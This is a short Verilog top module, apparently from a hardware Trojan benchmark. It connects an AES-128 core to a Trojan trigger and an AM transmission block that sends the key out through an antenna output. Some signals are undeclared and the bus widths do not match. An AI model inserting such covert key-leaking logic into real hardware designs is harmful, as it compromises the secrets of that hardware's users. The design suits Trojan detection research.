`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company:
// Engineer:
//
// Create Date:    12:55:51 03/08/2013
// Design Name:
// Module Name:    top
// Project Name:
// Target Devices:
// Tool versions:
// Description:
//
// Dependencies:
//
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    input [7:0] num,
    output [7:0] res);
    reg [63:0] state;
    reg [63:0] key;
    reg [63:0] result;
    wire [63:0] Capacitance;

    wire Antena;
    wire Tj_Trig;


    bufferin bi(clk, rst, num, statebi, keybi);

  	aes_128 AES (clk, statebi, keybi, out);
  	Trojan_Trigger Tj_Trigger (rst, clk, statebi, Tj_Trig);
    AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);

    bufferout bo(.clk(clk)
      ,.resultin(out)
      ,.capin(Antena)
      ,.resultout(res));

endmodule
